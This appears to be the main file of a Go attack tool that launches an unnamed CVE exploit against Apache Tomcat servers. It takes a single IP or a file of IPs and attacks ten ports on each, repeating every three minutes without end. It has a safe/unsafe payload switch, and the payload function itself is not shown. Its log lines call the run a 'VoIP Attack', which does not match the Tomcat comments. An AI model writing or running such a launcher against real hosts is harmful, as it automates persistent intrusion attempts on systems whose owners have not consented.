package main

import (
	"bufio"
	"flag"
	"log"
	"os"
	"regexp"
	"time"
)

func printChannelData(ch chan string, debug bool) {
	if debug {
		log.Println(<-ch)
	} else {
		<-ch
	}
}

func main() {
	isFile := false
	// Most usable ports for Apache Tomcat
	ports := [10]string{"8080", "80", "443", "8443", "8081", "3389", "7443", "5443", "8888", "1723"}
	target := flag.String(
		"t",
		"localhost",
		"Target url or target file to attack ")
	// Safe or UnSafe payload flag. False as default value
	safe := flag.Bool(
		"sF",
		false,
		"Flag to enable, disable safe mod attack")
	debug := flag.Bool(
		"d",
		false,
		"Flag to enable, disable logs")

	flag.Parse()

	var ips []string
	ipv4Regex := `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`
	// Checking if our -t parameter is IP or something else (file name)
	if match, _ := regexp.MatchString(ipv4Regex, *target); !match {
		isFile = true
		//trying to open file, otherwise mentioning how to launch the CVE
		file, err := os.Open(*target)
		if err != nil {
			log.Println("\n\033[31m Specify target like '-t <target_ip>' or '-t <target_filename>'")
			log.Println("\033[34m" + err.Error())
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)

		for scanner.Scan() {
			ips = append(ips, scanner.Text())
		}
	}

	// attack target(s) every 3 minutes until docker or instance is alive.
	for {
		//checking if the parameter is URL or not
		if !isFile {
			if *debug {
				log.Println("\n\033[34m[+] The target is in URL. Starting VoIP Attack...")
			}
			// attacking all usable for the Tomcat ports
			for _, tport := range ports {
				ch := make(chan string)
				go printChannelData(ch, *debug)
				doAttack(*target, tport, *safe, ch)
			}
		} else {
			if *debug {
				log.Println("\n\u001B[34m[+] The target is in file. Starting Async VoIP Attack...")
			}
			// Passing through all most ports for every IP target for the Tomcat
			for _, tport := range ports {
				for _, ip := range ips {
					ch := make(chan string)
					go printChannelData(ch, *debug)
					go doAttack(ip, tport, *safe, ch)
				}
			}
		}
		if *debug {
			log.Println("\n\033[33m NEXT CIRCLE!")
		}
		time.Sleep(3 * time.Minute)
	}

}
